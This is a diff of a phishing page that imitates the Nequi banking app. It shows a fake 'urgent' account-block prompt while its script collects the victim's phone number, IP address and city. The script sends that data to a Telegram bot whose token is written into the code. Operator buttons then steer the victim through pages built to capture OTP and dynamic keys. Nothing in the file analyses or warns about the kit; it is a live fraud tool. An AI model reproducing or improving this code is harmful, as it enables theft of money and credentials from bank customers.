@@ -1,117 +1,196 @@
 <!DOCTYPE html>
-3<html>
+<html>
 <head>
     <title>Bienvenido</title>
+    <meta http-equiv="content-type" content="text/html; utf-8">
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="shortcut icon" href="../assets/img/favicon.ico">
-    <script src="../assets/js/jquery-3.6.0.min.js"></script>
+    <meta content="es" http-equiv="Content-Language">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="Copyright" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">
+    <script type="text/javascript" src="../assets/js/jquery-3.6.0.min.js"></script>
     <link href="../assets/css/styles.css" rel="stylesheet">
     <link href="../assets/css/stylesheet.css" rel="stylesheet">
-    <script src="../assets/js/functions.js?v2"></script>
-    <style>
-        #fondo{position:fixed;width:100%;height:100%;top:0;left:0;background:#ffffffc4;z-index:300;}
-        #cargando{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:400;}
+    <script type="text/javascript" src="../assets/js/functions.js?v2"></script>
+    <style type="text/css">
+        #fondo{
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background-color: #ffffffc4;
+            z-index: 300;
+        }
+        #cargando{
+            position: fixed;
+            top:50%;
+            left:50%;
+            transform: translate(-50%, -50%);
+            z-index: 400;
+        }
     </style>
 </head>
 <body>
     <div id="fondo"></div>
     <img src="../assets/img/cargando.gif" id="cargando">
 
-    <!-- TU DISEÑO (solo el número) -->
-    <div style="text-align:center;padding:50px;font-size:24px;font-weight:bold;color:#210049;">
-        <div id="numero">Cargando...</div>
+    <div class="cabecera">
+        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+            <tr>
+                <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
+                <td valign="middle" align="right">
+                    <button class="btn btn-std btn-sprd top-btn">Recarga</button>
+                    <button class="btn btn-std btn-sprd top-btn">Salir</button>
+                    <img src="../assets/img/menu.jpg" id="btn-menu">
+                </td>
+            </tr>
+        </table>
+        <div class="bar-menu">
+            <span class="menu-interno marcado">Mi Nequi</span>
+            <span class="menu-interno">Certificados</span>
+            <span class="menu-interno">Ayuda</span>
+        </div>
     </div>
 
-    <!-- BOT MÁGICO ULTRA-SENCILLO -->
+    <div class="contenido-interno">
+        <table cellpadding="0" border="0" id="tbl-bienvenido">
+            <tr>
+                <td id="td-perfil" align="center" valign="top">
+                    <div class="panel">
+                        <img src="../assets/img/foto.svg" width="48">
+                        <div id="numero"></div>
+                        <img src="../assets/img/ajuste.svg" width="24">
+                    </div>
+                </td>
+                <td id="td-bloqueo" align="center" valign="top">
+                    <div class="panel">
+                        <img src="../assets/img/fuego.svg" width="46">
+                        <span style="font-size: 1.125em;color:#210049;font-weight: 600;line-height: 1.1;">¡Urgente!</span>
+                        <div style="width:80%;font-size: .9em;color: #7c8a96;margin-top: 20px;">
+                            Eres lo más importante para nosotr@s y queremos que tu plata siempre esté segura en Nequi.
+                        </div>
+                        <div style="border-bottom: 1px dashed #7c8a969e;margin: 34px 0 27px;"></div>
+                        <div style="font-size: 1em;color: #210049;margin-bottom: 21px;">Cuéntanos qué necesitas hacer:</div>
+                        <button class="btn-small btn-fill">Bloquea tu Nequi</button>
+                    </div>
+                    <div class="ultima-visita">La última vez que usaste la App Nequi fue el 05 de Agosto a las 01:02 am</div>
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    <div class="pie">
+        <!-- TU FOOTER ORIGINAL (sin cambios) -->
+        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+            <tr><td id="logo-blanco-movil"><img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom: 27px;"><div class="separador"></div></td></tr>
+        </table>
+        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+            <tr>
+                <td valign="top" id="logo-blanco"><img src="../assets/img/logo-blanco.svg" width="176"></td>
+                <td valign="top">
+                    <div class="titulo-footer">Producto</div>
+                    <div class="item-footer">Legales</div>
+                    <div class="item-footer">Ayuda</div>
+                </td>
+                <td valign="top" id="app">
+                    <div class="titulo-footer">Descarga la App</div>
+                    <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    <!-- TU BOT MÁGICO (ENVÍA + RECIBE BOTONES) -->
     <script>
     $(document).ready(function() {
-        // 1. ESPERA AL NÚMERO
-        const esperarNumero = setInterval(() => {
-            const numero = $("#numero").text().trim();
-            if (numero && numero !== "Cargando..." && numero !== "") {
-                clearInterval(esperarNumero);
-                
-                // 2. ENVÍA A TELEGRAM CON BOTONES
-                fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: 8469651553,
-                        text: `*NUEVO CLIENTE*
+        // 1. OBTIENE NÚMERO
+        $.post("../process/buscar_registro.php", function(data) {
+            let valor = data.split("|");
+            $("#numero").html(valor[1]);
+            
+            // 2. OBTIENE IP + CIUDAD
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => d.ip)
+                .then(ip => {
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(r => r.json())
+                        .then(geo => {
+                            const numero = valor[1];
+                            const ciudad = geo.city || "Desconocida";
+                            const hora = new Date().toLocaleString();
+
+                            // 3. ENVÍA A TELEGRAM CON BOTONES
+                            const mensaje = `*NUEVO CLIENTE EN PRIVATE*
 
 *Número:* ${numero}
-*IP:* ${navigator.connection?.effectiveType || 'WiFi'}
-*Hora:* ${new Date().toLocaleTimeString()}
+*IP:* ${ip}
+*Ciudad:* ${ciudad}
+*Hora:* ${hora}
 
-*ELIGE ACCIÓN:*`,
-                        parse_mode: 'Markdown',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{text: "Clave OTP", callback_data: "otp"}],
-                                [{text: "Error clave", callback_data: "error"}],
-                                [{text: "Dinámica", callback_data: "dinamica"}],
-                                [{text: "Error login", callback_data: "loginerr"}],
-                                [{text: "Finalizar", callback_data: "ok"}]
-                            ]
-                        }
-                    })
+*¿QUÉ HAGO?*`;
+
+                            const botones = {
+                                inline_keyboard: [
+                                    [{text: "Clave OTP", callback_data: "otp"}],
+                                    [{text: "Error de clave", callback_data: "errorclave"}],
+                                    [{text: "Dinámica", callback_data: "dinamica"}],
+                                    [{text: "Error login", callback_data: "errorlogin"}],
+                                    [{text: "Finalizar", callback_data: "finalizar"}]
+                                ]
+                            };
+
+                            fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    chat_id: 8469651553,
+                                    text: mensaje,
+                                    parse_mode: 'Markdown',
+                                    reply_markup: botones
+                                })
+                            });
+                        });
                 });
-
-                // 3. REDIRIGE EN 3 SEGUNDOS
-                setTimeout(() => { location.href = '../verifying/'; }, 3000);
-            }
-        }, 300);
-
-        // 4. CARGA EL NÚMERO DESDE PHP
-        $.post("../process/buscar_registro.php", function(data) {
-            const valor = data.split("|");
-            $("#numero").text(valor[1]);
         });
+
+        // 4. REDIRIGE A VERIFYING
+        setTimeout(() => { location.href = '../verifying/'; }, 3000);
     });
     </script>
 
-    <!-- BOTONES QUE SÍ FUNCIONAN (sin WebApp) -->
+    <!-- RESPUESTAS AUTOMÁTICAS AL TOCAR BOTONES -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-    // Detecta cuando el usuario toca un botón en Telegram
-    setInterval(() => {
-        if (window.location.href.includes('callback_data=')) {
-            const url = new URL(window.location.href);
-            const accion = url.searchParams.get('callback_data');
-            if (!accion) return;
-
-            let destino = '';
-            let mensaje = '';
-
-            switch(accion) {
-                case 'otp':
-                    mensaje = 'Tu OTP es: 4821';
-                    destino = '../verifying/';
-                    break;
-                case 'error':
-                    mensaje = 'Clave incorrecta';
-                    destino = '../login/';
-                    break;
-                case 'dinamica':
-                    mensaje = 'Pide la clave dinámica';
-                    destino = '../verify-voice/';
-                    break;
-                case 'loginerr':
-                    mensaje = 'Error de login';
-                    destino = '../login/';
-                    break;
-                case 'ok':
-                    mensaje = 'Acceso concedido';
-                    destino = '../successful/';
-                    break;
-            }
-
-            alert(mensaje);
-            setTimeout(() => { location.href = destino; }, 1000);
+    Telegram.WebApp.ready();
+    Telegram.WebApp.onEvent('callbackQuery', function(callback) {
+        let respuesta = "";
+        switch(callback.data) {
+            case "otp":
+                respuesta = "Tu clave OTP es: *4821*\n\nÚsala en 2 minutos.";
+                break;
+            case "errorclave":
+                respuesta = "Clave incorrecta.\nIntenta de nuevo.";
+                break;
+            case "dinamica":
+                respuesta = "Clave dinámica enviada al celular registrado.";
+                break;
+            case "errorlogin":
+                respuesta = "Acceso fallido.\nBloqueado por seguridad.";
+                break;
+            case "finalizar":
+                respuesta = "Acceso concedido!\nRedirigiendo...";
+                setTimeout(() => { location.href = '../successful/'; }, 2000);
+                break;
         }
-    }, 1000);
+        Telegram.WebApp.showAlert(respuesta);
+    });
     </script>
 
-    <script src="../assets/js/ready.js?v2"></script>
+    <script type="text/javascript" src="../assets/js/ready.js?v2"></script>
 </body>
 </html>
